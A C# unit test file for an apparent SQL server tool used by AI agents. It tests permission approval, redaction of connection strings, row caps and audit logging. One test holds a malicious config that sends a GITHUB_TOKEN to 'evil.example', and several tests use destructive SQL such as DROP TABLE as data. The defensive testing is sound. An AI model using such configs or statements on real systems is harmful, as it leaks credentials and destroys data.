using System.Text.Json.Nodes;
using SqlMcp.Audit;
using SqlMcp.Execution;
using SqlMcp.Mcp;
using SqlMcp.Permissions;

namespace SqlMcp.Tests.Mcp;

public sealed class ToolPipelineTests : IDisposable
{
    private const string Sales = "sqlhost:1433/sales";
    private const string OneDatabase = """{ "databases": [ { "connectionString": "Server=sqlhost;Database=Sales;Password=s3cret" } ] }""";

    private readonly SessionBuilder _builder = new();

    private static CancellationToken Cancel => TestContext.Current.CancellationToken;

    public void Dispose() => _builder.Dispose();

    [Fact]
    public void Listing_shows_provenance()
    {
        // The user denies command; the project allows it and ddl, but isn't approved.
        _builder
            .User("""{ "defaults": { "deny": ["command"] }, "databases": [ { "connectionString": "Server=sqlhost;Database=Sales" } ] }""")
            .Project("""{ "databases": [ { "connectionString": "Server=sqlhost;Database=Sales", "allow": ["command", "ddl"] } ] }""");
        using var session = _builder.Build();

        var listing = Json(new ToolPipeline(session).ListDatabases());

        var db = Assert.Single(listing["databases"]!.AsArray())!;
        Assert.Equal(Sales, db["id"]!.GetValue<string>());
        Assert.True(db["available"]!.GetValue<bool>());
        Assert.Equal(["query:default", "introspection:default"], Groups(db["allowed"]!));
        Assert.Equal(["command:project config not approved", "ddl:project config not approved", "execute:default"], Groups(db["denied"]!));

        var ddl = db["denied"]!.AsArray().Single(g => g!["group"]!.GetValue<string>() == "ddl")!;
        Assert.Equal(ApprovalMessages.NotApproved(ApprovalMessages.Grants(ToolGroup.Ddl)), ddl["reason"]!.GetValue<string>());

        Assert.Equal(ApprovalMessages.NotApproved("grants command, grants ddl"), db["not_approved"]!.GetValue<string>());
        Assert.Equal(1000, db["limits"]!["max_rows"]!.GetValue<int>());
        Assert.Equal(5 * 1024 * 1024, db["limits"]!["max_bytes"]!.GetValue<long>());
        Assert.Equal(100, db["limits"]!["page_size"]!.GetValue<int>());
        Assert.Equal(30, db["limits"]!["timeout_seconds"]!.GetValue<int>());
        Assert.Equal(1000, db["limits"]!["max_affected_rows"]!.GetValue<int>());
    }

    [Fact]
    public void Affected_rows_cap_is_listed()
    {
        _builder.User("""{ "databases": [ { "connectionString": "Server=localhost;Database=App", "limits": { "maxAffectedRows": 50 } } ] }""");
        using var session = _builder.Build();

        var db = Assert.Single(Json(new ToolPipeline(session).ListDatabases())["databases"]!.AsArray())!;

        Assert.Equal(50, db["limits"]!["max_affected_rows"]!.GetValue<int>());
    }

    [Fact]
    public void An_ignored_affected_rows_cap_raise_is_waiting_for_approval()
    {
        _builder
            .User("""{ "databases": [ { "connectionString": "Server=sqlhost;Database=Sales" } ] }""")
            .Project("""{ "databases": [ { "connectionString": "Server=sqlhost;Database=Sales", "limits": { "maxAffectedRows": 5000 } } ] }""");
        using var session = _builder.Build();

        var db = Assert.Single(Json(new ToolPipeline(session).ListDatabases())["databases"]!.AsArray())!;

        Assert.Equal(1000, db["limits"]!["max_affected_rows"]!.GetValue<int>());
        Assert.Equal(ApprovalMessages.NotApproved(ApprovalMessages.Raises("maxAffectedRows")), db["not_approved"]!.GetValue<string>());
    }

    [Fact]
    public void An_ignored_limit_raise_is_listed_in_the_approval_wording()
    {
        _builder
            .User("""{ "databases": [ { "connectionString": "Server=sqlhost;Database=Sales" } ] }""")
            .Project("""{ "databases": [ { "connectionString": "Server=sqlhost;Database=Sales", "limits": { "maxRows": 5000 } } ] }""");
        using var session = _builder.Build();

        var db = Assert.Single(Json(new ToolPipeline(session).ListDatabases())["databases"]!.AsArray())!;

        Assert.Equal(1000, db["limits"]!["max_rows"]!.GetValue<int>());
        var notApproved = db["not_approved"]!.GetValue<string>();
        Assert.Equal(ApprovalMessages.NotApproved(ApprovalMessages.Raises("maxRows")), notApproved);
        Assert.Contains(ApprovalMessages.AskTheUser, notApproved, StringComparison.Ordinal);
    }

    [Fact]
    public void Unavailable_database()
    {
        _builder.User("""{ "databases": [ { "connectionString": "Server=sqlhost;Database=Sales;User ID=app;Password=${env:SALES_PASSWORD}" } ] }""");
        using var session = _builder.Build();

        var result = new ToolPipeline(session).ListDatabases();

        var db = Assert.Single(Json(result)["databases"]!.AsArray())!;
        Assert.False(db["available"]!.GetValue<bool>());
        Assert.Contains("SALES_PASSWORD", db["unavailable_reason"]!.GetValue<string>(), StringComparison.Ordinal);
        Assert.DoesNotContain("Server=", result.Text, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("User ID", result.Text, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public async Task An_unapproved_project_database_is_never_connected_to_and_the_agent_is_told_to_ask_the_user()
    {
        _builder.Variable("GITHUB_TOKEN", "secret-token")
            .Project("""{ "databases": [ { "connectionString": "Server=evil.example;Database=X;Password=${env:GITHUB_TOKEN}" } ] }""");
        using var session = _builder.Build();

        var result = await new ToolPipeline(session).QueryAsync("evil.example:1433/x", "SELECT 1 AS n", Cancel);

        Assert.True(result.IsError);
        Assert.Equal(
            "evil.example:1433/x is unavailable: project config adds this database but is not approved. Ask the user to run `sql-mcp approve` in their own terminal. Agents cannot approve.",
            result.Text);
        Assert.Empty(_builder.Executor.Calls);
        Assert.DoesNotContain("secret-token", new ToolPipeline(session).ListDatabases().Text, StringComparison.Ordinal);
    }

    [Fact]
    public async Task An_unavailable_database_is_never_connected_to()
    {
        _builder.User("""{ "databases": [ { "connectionString": "Server=sqlhost;Database=Sales;Password=${env:SALES_PASSWORD}" } ] }""");
        using var session = _builder.Build();

        var result = await new ToolPipeline(session).QueryAsync(Sales, "SELECT 1 AS n", Cancel);

        Assert.True(result.IsError);
        Assert.StartsWith($"{Sales} is unavailable:", result.Text, StringComparison.Ordinal);
        Assert.Contains("SALES_PASSWORD", result.Text, StringComparison.Ordinal);
        Assert.Empty(_builder.Executor.Calls);
    }

    [Fact]
    public void Connection_strings_never_appear_in_the_listing()
    {
        _builder.User(OneDatabase);
        using var session = _builder.Build();

        var text = new ToolPipeline(session).ListDatabases().Text;

        Assert.DoesNotContain("s3cret", text, StringComparison.Ordinal);
        Assert.DoesNotContain("Server=", text, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void No_databases()
    {
        using var session = _builder.Build();

        var listing = Json(new ToolPipeline(session).ListDatabases());

        Assert.Empty(listing["databases"]!.AsArray());
        Assert.Equal(session.NoDatabasesMessage, listing["message"]!.GetValue<string>());
    }

    [Fact]
    public async Task Denied_group()
    {
        _builder.User("""{ "databases": [ { "connectionString": "Server=sqlhost;Database=Sales", "deny": ["query"] } ] }""");
        using var session = _builder.Build();

        var result = await new ToolPipeline(session).QueryAsync(Sales, "SELECT 1 AS n", Cancel);

        Assert.True(result.IsError);
        Assert.Equal($"query is denied on {Sales} (source: user config).", result.Text);
        Assert.Empty(_builder.Executor.Calls);

        var denied = SessionBuilder.Events(session).Single(e => e["event"]!.GetValue<string>() == "denied");
        Assert.Equal("query", denied["tool"]!.GetValue<string>());
        Assert.Equal(Sales, denied["database"]!.GetValue<string>());
        Assert.Equal("user config", denied["source"]!.GetValue<string>());
        Assert.Equal(result.Text, denied["reason"]!.GetValue<string>());
    }

    [Fact]
    public async Task An_unapproved_denial_asks_the_user_and_not_the_agent()
    {
        _builder
            .User("""{ "databases": [ { "connectionString": "Server=sqlhost;Database=Sales", "deny": ["query"] } ] }""")
            .Project("""{ "databases": [ { "connectionString": "Server=sqlhost;Database=Sales", "allow": ["query"] } ] }""");
        using var session = _builder.Build();

        var result = await new ToolPipeline(session).QueryAsync(Sales, "SELECT 1 AS n", Cancel);

        Assert.True(result.IsError);
        Assert.Equal(
            $"query is denied on {Sales} (source: project config not approved). {ApprovalMessages.NotApproved(ApprovalMessages.Grants(ToolGroup.Query))}",
            result.Text);
        Assert.Contains(ApprovalMessages.AskTheUser, result.Text, StringComparison.Ordinal);
        Assert.Empty(_builder.Executor.Calls);
        var denied = SessionBuilder.Events(session).Single(e => e["event"]!.GetValue<string>() == "denied");
        Assert.Equal("project config not approved", denied["source"]!.GetValue<string>());
    }

    [Fact]
    public async Task Unknown_identifier_in_a_tool_call()
    {
        _builder.User(OneDatabase);
        using var session = _builder.Build();

        var result = await new ToolPipeline(session).QueryAsync("otherhost:1433/sales", "SELECT 1 AS n", Cancel);

        Assert.True(result.IsError);
        Assert.Equal($"Unknown database \"otherhost:1433/sales\". Known databases: {Sales}.", result.Text);
        Assert.Empty(_builder.Executor.Calls);
    }

    [Fact]
    public async Task Identifiers_match_case_insensitively()
    {
        _builder.User(OneDatabase);
        using var session = _builder.Build();

        var result = await new ToolPipeline(session).QueryAsync("SQLHOST:1433/Sales", "SELECT 1 AS n", Cancel);

        Assert.False(result.IsError, result.Text);
    }

    [Fact]
    public async Task Wrong_tool()
    {
        _builder.User("""{ "databases": [ { "connectionString": "Server=sqlhost;Database=Sales", "allow": ["command"] } ] }""");
        using var session = _builder.Build();

        var result = await new ToolPipeline(session).QueryAsync(Sales, "DELETE FROM dbo.users WHERE id = 1", Cancel);

        Assert.True(result.IsError);
        Assert.Equal("Rejected, nothing was sent to the database: classified as command; use the command tool", result.Text);
        Assert.Empty(_builder.Executor.Calls);
    }

    [Fact]
    public async Task Right_tool_is_denied_here()
    {
        // command is allowed on another database, but the reason is about the target one.
        _builder.User("""
            { "databases": [
                { "connectionString": "Server=sqlhost;Database=Sales" },
                { "connectionString": "Server=sqlhost;Database=Scratch", "allow": ["command"] } ] }
            """);
        using var session = _builder.Build();

        var result = await new ToolPipeline(session).QueryAsync(Sales, "DELETE FROM dbo.users WHERE id = 1", Cancel);

        Assert.True(result.IsError);
        Assert.Equal("Rejected, nothing was sent to the database: classified as command; the command tool is denied on this database", result.Text);
        Assert.Empty(_builder.Executor.Calls);

        var denied = SessionBuilder.Events(session).Single(e => e["event"]!.GetValue<string>() == "denied");
        Assert.Equal("DELETE FROM dbo.users WHERE id = 1", denied["sql"]!.GetValue<string>());
        Assert.Equal(result.Text, denied["reason"]!.GetValue<string>());
        Assert.Null(denied["source"]);
    }

    [Fact]
    public async Task Successful_query_then_every_page()
    {
        _builder.User(OneDatabase);
        _builder.Executor.Outcome = new QuerySucceeded(Rows(250), TimeSpan.FromMilliseconds(12));
        using var session = _builder.Build();
        var pipeline = new ToolPipeline(session);

        var first = Json(await pipeline.QueryAsync(Sales, "SELECT id, name FROM dbo.users", Cancel));

        Assert.Equal(["SELECT id, name FROM dbo.users"], _builder.Executor.Calls);
        Assert.Equal([BatchMode.ReadOnly], _builder.Executor.Modes);
        Assert.Equal(250, first["rows_buffered"]!.GetValue<int>());
        Assert.False(first["truncated"]!.GetValue<bool>());
        Assert.Equal(1, first["result_sets"]!.GetValue<int>());
        Assert.Equal("""[{"name":"id","type":"int"},{"name":"name","type":"nvarchar(50)"}]""", first["columns"]!.ToJsonString());
        Assert.Equal((1, 100, 3), (first["first_row"]!.GetValue<int>(), first["last_row"]!.GetValue<int>(), first["pages"]!.GetValue<int>()));
        Assert.False(first["last_page"]!.GetValue<bool>());
        var handle = first["handle"]!.GetValue<string>();

        var second = Json(pipeline.NextPage(handle));
        Assert.Equal(101, second["first_row"]!.GetValue<int>());
        Assert.Null(second["rows_buffered"]);

        var third = Json(pipeline.NextPage(handle));
        Assert.Equal((201, 250), (third["first_row"]!.GetValue<int>(), third["last_row"]!.GetValue<int>()));
        Assert.True(third["last_page"]!.GetValue<bool>());
        Assert.Null(third["handle"]);

        var gone = pipeline.NextPage(handle);
        Assert.True(gone.IsError);
        Assert.Equal(ResultStore.UnknownHandleMessage, gone.Text);
    }

    [Fact]
    public async Task Executed_event_has_counts_and_no_values()
    {
        _builder.User(OneDatabase);
        _builder.Executor.Outcome = new QuerySucceeded(Rows(3), TimeSpan.FromMilliseconds(12));
        using var session = _builder.Build();

        await new ToolPipeline(session).QueryAsync(Sales, "SELECT id, name FROM dbo.users", Cancel);

        var executed = SessionBuilder.Events(session).Single(e => e["event"]!.GetValue<string>() == "executed");
        Assert.Equal("query", executed["tool"]!.GetValue<string>());
        Assert.Equal(Sales, executed["database"]!.GetValue<string>());
        Assert.Equal("""["query"]""", executed["classification"]!.ToJsonString());
        Assert.Equal(3, executed["rows"]!.GetValue<long>());
        Assert.Equal(12, executed["duration_ms"]!.GetValue<long>());
        Assert.False(executed["truncated"]!.GetValue<bool>());

        var log = File.ReadAllText(session.Audit.FilePath!);
        Assert.DoesNotContain("user-2", log, StringComparison.Ordinal);
        Assert.DoesNotContain("s3cret", log, StringComparison.Ordinal);
    }

    [Fact]
    public async Task Truncation_is_reported_on_the_first_page()
    {
        _builder.User(OneDatabase);
        _builder.Executor.Outcome = new QuerySucceeded(Rows(5) with { Truncated = true, TruncationMessage = "result truncated: narrow it" }, TimeSpan.Zero);
        using var session = _builder.Build();

        var first = Json(await new ToolPipeline(session).QueryAsync(Sales, "SELECT id, name FROM dbo.users", Cancel));

        Assert.True(first["truncated"]!.GetValue<bool>());
        Assert.Equal("result truncated: narrow it", first["truncation_message"]!.GetValue<string>());
        Assert.True(SessionBuilder.Events(session).Single(e => e["event"]!.GetValue<string>() == "executed")["truncated"]!.GetValue<bool>());
    }

    [Fact]
    public async Task Failed_query_returns_the_message_but_audits_only_the_numbers()
    {
        _builder.User(OneDatabase);
        _builder.Executor.Outcome = new QueryFailed(
            FailureKind.Sql, "Conversion failed when converting the varchar value 'alice@example.com' to data type int.", 245, 16, 1, TimeSpan.FromMilliseconds(3));
        using var session = _builder.Build();

        var result = await new ToolPipeline(session).QueryAsync(Sales, "SELECT CAST(email AS int) AS n FROM dbo.users", Cancel);

        Assert.True(result.IsError);
        Assert.Contains("alice@example.com", result.Text, StringComparison.Ordinal);
        var failed = SessionBuilder.Events(session).Single(e => e["event"]!.GetValue<string>() == "failed");
        Assert.Equal(245, failed["error_number"]!.GetValue<int>());
        Assert.Equal("sql", failed["kind"]!.GetValue<string>());
        Assert.DoesNotContain("alice@example.com", File.ReadAllText(session.Audit.FilePath!), StringComparison.Ordinal);
    }

    [Fact]
    public async Task A_cancelled_query_is_still_audited()
    {
        _builder.User(OneDatabase);
        _builder.Executor.Cancels = true;
        using var session = _builder.Build();

        await Assert.ThrowsAnyAsync<OperationCanceledException>(() => new ToolPipeline(session).QueryAsync(Sales, "SELECT id FROM dbo.users", Cancel));

        var failed = SessionBuilder.Events(session).Single(e => e["event"]!.GetValue<string>() == "failed");
        Assert.Equal("other", failed["kind"]!.GetValue<string>());
        Assert.Equal("SELECT id FROM dbo.users", failed["sql"]!.GetValue<string>());
    }

    [Fact]
    public async Task An_exception_from_the_executor_is_audited_and_reported()
    {
        _builder.User(OneDatabase);
        _builder.Executor.Throws = new InvalidCastException("Unable to cast object of type 'System.Byte[]'.");
        using var session = _builder.Build();

        var result = await new ToolPipeline(session).QueryAsync(Sales, "SELECT id FROM dbo.users", Cancel);

        Assert.True(result.IsError);
        Assert.Equal("query failed: Unable to cast object of type 'System.Byte[]'.", result.Text);
        var failed = SessionBuilder.Events(session).Single(e => e["event"]!.GetValue<string>() == "failed");
        Assert.Equal("other", failed["kind"]!.GetValue<string>());
        Assert.Equal("SELECT id FROM dbo.users", failed["sql"]!.GetValue<string>());
    }

    [Fact]
    public async Task Abandon_releases_the_handle()
    {
        _builder.User(OneDatabase);
        _builder.Executor.Outcome = new QuerySucceeded(Rows(250), TimeSpan.Zero);
        using var session = _builder.Build();
        var pipeline = new ToolPipeline(session);
        var handle = Json(await pipeline.QueryAsync(Sales, "SELECT id, name FROM dbo.users", Cancel))["handle"]!.GetValue<string>();

        Assert.Equal("""{"released":true}""", pipeline.Abandon(handle).Text);

        Assert.Equal(ResultStore.UnknownHandleMessage, pipeline.NextPage(handle).Text);
        Assert.Equal(ResultStore.UnknownHandleMessage, pipeline.Abandon(handle).Text);
    }

    [Fact]
    public async Task Audit_log_unavailable()
    {
        _builder.User(OneDatabase);
        using var session = _builder.Build();
        session.Audit.Dispose();
        var pipeline = new ToolPipeline(session);

        Assert.Equal(AuditLog.UnavailableMessage, pipeline.ListDatabases().Text);
        Assert.Equal(AuditLog.UnavailableMessage, (await pipeline.QueryAsync(Sales, "SELECT 1 AS n", Cancel)).Text);
        Assert.Equal(AuditLog.UnavailableMessage, pipeline.NextPage("x").Text);
        Assert.Equal(AuditLog.UnavailableMessage, pipeline.Abandon("x").Text);
        Assert.Empty(_builder.Executor.Calls);
    }

    [Fact]
    public async Task Invalid_config_is_reported_by_every_tool()
    {
        _builder.User("""{ "databases": [ { "connectionString": "Server=sqlhost;Database=Sales", "allow": ["admin"] } ] }""");
        using var session = _builder.Build();
        var pipeline = new ToolPipeline(session);

        var listing = pipeline.ListDatabases();
        var query = await pipeline.QueryAsync(Sales, "SELECT 1 AS n", Cancel);

        Assert.True(listing.IsError);
        Assert.Contains("$.databases[0].allow[0]", listing.Text, StringComparison.Ordinal);
        Assert.Contains("Ask the user to fix it", listing.Text, StringComparison.Ordinal);
        Assert.Equal(listing.Text, query.Text);
        Assert.Empty(_builder.Executor.Calls);
        Assert.Equal([_builder.Paths.UserConfig], session.ConfigFiles);
    }

    public static TheoryData<string, string> WritesOfAnotherCategory => new()
    {
        { ToolNames.Command, "DROP TABLE dbo.users" },
        { ToolNames.Ddl, "DELETE FROM dbo.users WHERE id = 1" },
        { ToolNames.Execute, "SELECT id FROM dbo.users" },
    };

    [Theory]
    [MemberData(nameof(WritesOfAnotherCategory))]
    public async Task Statement_of_another_category(string tool, string sql)
    {
        _builder.User(AllWrites);
        using var session = _builder.Build();

        var result = await Write(new ToolPipeline(session), tool, sql);

        Assert.True(result.IsError);
        Assert.StartsWith("Rejected, nothing was sent to the database: classified as ", result.Text, StringComparison.Ordinal);
        Assert.Empty(_builder.Executor.Calls);
        var denied = SessionBuilder.Events(session).Single(e => e["event"]!.GetValue<string>() == "denied");
        Assert.Equal(tool, denied["tool"]!.GetValue<string>());
        Assert.Equal(sql, denied["sql"]!.GetValue<string>());
    }

    [Fact]
    public async Task Command_rejects_ddl_naming_the_tool_that_would_run_it()
    {
        _builder.User(AllWrites);
        using var session = _builder.Build();

        var result = await new ToolPipeline(session).CommandAsync(Sales, "DROP TABLE dbo.users", Cancel);

        Assert.Equal("Rejected, nothing was sent to the database: classified as ddl; use the ddl tool", result.Text);
    }

    [Theory]
    [InlineData(ToolNames.Command)]
    [InlineData(ToolNames.Ddl)]
    [InlineData(ToolNames.Execute)]
    public async Task Group_denied(string tool)
    {
        // Every write group is denied by default.
        _builder.User(OneDatabase);
        using var session = _builder.Build();

        var result = await Write(new ToolPipeline(session), tool, "UPDATE dbo.users SET name = 'x' WHERE id = 1");

        Assert.True(result.IsError);
        Assert.Equal($"{tool} is denied on {Sales} (source: default).", result.Text);
        Assert.Empty(_builder.Executor.Calls);
        var denied = SessionBuilder.Events(session).Single(e => e["event"]!.GetValue<string>() == "denied");
        Assert.Equal(tool, denied["tool"]!.GetValue<string>());
        Assert.Equal("default", denied["source"]!.GetValue<string>());
    }

    [Theory]
    [InlineData(ToolNames.Command, "UPDATE dbo.users SET name = 'x' WHERE id = 1")]
    [InlineData(ToolNames.Ddl, "CREATE INDEX ix_name ON dbo.users (name)")]
    [InlineData(ToolNames.Execute, "EXEC dbo.archive_orders @before = '2026-01-01'")]
    public async Task Write_tools_run_in_write_mode(string tool, string sql)
    {
        _builder.User(AllWrites);
        using var session = _builder.Build();

        await Write(new ToolPipeline(session), tool, sql);

        Assert.Equal([sql], _builder.Executor.Calls);
        Assert.Equal([BatchMode.Write], _builder.Executor.Modes);
    }

    [Fact]
    public async Task Committed_write()
    {
        _builder.User(AllWrites);
        _builder.Executor.Outcome = new QuerySucceeded(new BufferedResult([], false, null), TimeSpan.FromMilliseconds(9)) { RowsAffected = [3, 5] };
        using var session = _builder.Build();
        const string sql = "UPDATE dbo.users SET name = 'x' WHERE id < 4; DELETE FROM dbo.users WHERE id > 10";

        var result = await new ToolPipeline(session).CommandAsync(Sales, sql, Cancel);

        // No result sets, so no pages and no handle.
        Assert.Equal("""{"committed":true,"rows_affected":[3,5]}""", result.Text);
        Assert.False(result.IsError);

        var executed = SessionBuilder.Events(session).Single(e => e["event"]!.GetValue<string>() == "executed");
        Assert.Equal("command", executed["tool"]!.GetValue<string>());
        Assert.Equal(Sales, executed["database"]!.GetValue<string>());
        Assert.Equal(sql, executed["sql"]!.GetValue<string>());
        Assert.Equal("""["command","command"]""", executed["classification"]!.ToJsonString());
        Assert.Equal("[3,5]", executed["rows_affected"]!.ToJsonString());
    }

    [Fact]
    public async Task A_write_with_result_sets_is_paged_like_a_query()
    {
        _builder.User(AllWrites);
        _builder.Executor.Outcome = new QuerySucceeded(Rows(250), TimeSpan.Zero) { RowsAffected = [250] };
        using var session = _builder.Build();
        var pipeline = new ToolPipeline(session);

        var first = Json(await pipeline.CommandAsync(Sales, "DELETE FROM dbo.users OUTPUT deleted.id, deleted.name WHERE id > 0", Cancel));

        Assert.True(first["committed"]!.GetValue<bool>());
        Assert.Equal("[250]", first["rows_affected"]!.ToJsonString());
        Assert.Equal(3, first["pages"]!.GetValue<int>());
        Assert.Equal(100, first["rows"]!.AsArray().Count);
        var handle = first["handle"]!.GetValue<string>();

        var second = Json(pipeline.NextPage(handle));
        Assert.Equal(2, second["page"]!.GetValue<int>());
        Assert.False(second.ContainsKey("committed"));
    }

    [Fact]
    public async Task A_read_logs_no_rows_affected()
    {
        _builder.User(OneDatabase);
        using var session = _builder.Build();

        await new ToolPipeline(session).QueryAsync(Sales, "SELECT id FROM dbo.users", Cancel);

        var executed = SessionBuilder.Events(session).Single(e => e["event"]!.GetValue<string>() == "executed");
        Assert.False(executed.ContainsKey("rows_affected"));
    }

    [Fact]
    public async Task Write_rolled_back_by_the_cap()
    {
        _builder.User(AllWrites);
        _builder.Executor.Outcome = new QueryFailed(FailureKind.AffectedRowsCap, "over the affected-rows cap: the statements that completed affected 5000 rows … nothing was committed.", null, null, null, TimeSpan.Zero)
        {
            Cap = 1000,
            Affected = 5000,
        };
        using var session = _builder.Build();

        var result = await new ToolPipeline(session).CommandAsync(Sales, "UPDATE dbo.users SET name = 'x' WHERE id > 0", Cancel);

        Assert.True(result.IsError);
        Assert.Equal("over the affected-rows cap: the statements that completed affected 5000 rows … nothing was committed.", result.Text);
        var events = SessionBuilder.Events(session);
        Assert.DoesNotContain(events, e => e["event"]!.GetValue<string>() == "executed");
        var failed = events.Single(e => e["event"]!.GetValue<string>() == "failed");
        Assert.Equal("command", failed["tool"]!.GetValue<string>());
        Assert.Equal("affected_rows_cap", failed["kind"]!.GetValue<string>());
        Assert.Equal(1000, failed["cap"]!.GetValue<int>());
        Assert.Equal(5000, failed["affected"]!.GetValue<long>());
    }

    [Fact]
    public async Task An_escaping_exception_in_a_write_says_nothing_was_committed()
    {
        _builder.User(AllWrites);
        _builder.Executor.Throws = new InvalidOperationException("no converter");
        using var session = _builder.Build();

        var result = await new ToolPipeline(session).CommandAsync(Sales, "UPDATE dbo.users SET name = 'x' WHERE id = 1", Cancel);

        Assert.Equal("command failed: no converter The batch was rolled back, so nothing was committed.", result.Text);
        var failed = SessionBuilder.Events(session).Single(e => e["event"]!.GetValue<string>() == "failed");
        Assert.Equal("other", failed["kind"]!.GetValue<string>());
    }

    [Fact]
    public async Task A_committed_write_the_log_could_not_record_is_reported_as_committed()
    {
        _builder.User(AllWrites);
        _builder.Executor.Outcome = new QuerySucceeded(new BufferedResult([], false, null), TimeSpan.Zero) { RowsAffected = [1] };
        using var session = _builder.Build();
        _builder.Executor.During = session.Audit.Dispose;

        var result = await new ToolPipeline(session).CommandAsync(Sales, "UPDATE dbo.users SET name = 'x' WHERE id = 1", Cancel);

        Assert.True(result.IsError);
        Assert.StartsWith("audit log unavailable: the batch was committed", result.Text, StringComparison.Ordinal);
        Assert.Contains("Don't run it again", result.Text, StringComparison.Ordinal);
    }

    private const string AllWrites = """{ "databases": [ { "connectionString": "Server=sqlhost;Database=Sales", "allow": ["command", "ddl", "execute"] } ] }""";

    private static Task<ToolResult> Write(ToolPipeline pipeline, string tool, string sql) => tool switch
    {
        ToolNames.Command => pipeline.CommandAsync(Sales, sql, Cancel),
        ToolNames.Ddl => pipeline.DdlAsync(Sales, sql, Cancel),
        ToolNames.Execute => pipeline.ExecuteAsync(Sales, sql, Cancel),
        _ => throw new ArgumentOutOfRangeException(nameof(tool), tool, null),
    };

    private static JsonObject Json(ToolResult result)
    {
        Assert.False(result.IsError, result.Text);
        return JsonNode.Parse(result.Text)!.AsObject();
    }

    private static List<string> Groups(JsonNode groups) =>
        [.. groups.AsArray().Select(g => $"{g!["group"]!.GetValue<string>()}:{g["source"]!.GetValue<string>()}")];

    private static BufferedResult Rows(int count) => new(
        [
            new ResultSet(
                [new ResultColumn("id", "int"), new ResultColumn("name", "nvarchar(50)")],
                [.. Enumerable.Range(1, count).Select(i => new JsonNode?[] { JsonValue.Create(i), JsonValue.Create($"user-{i}") })]),
        ],
        false,
        null);
}
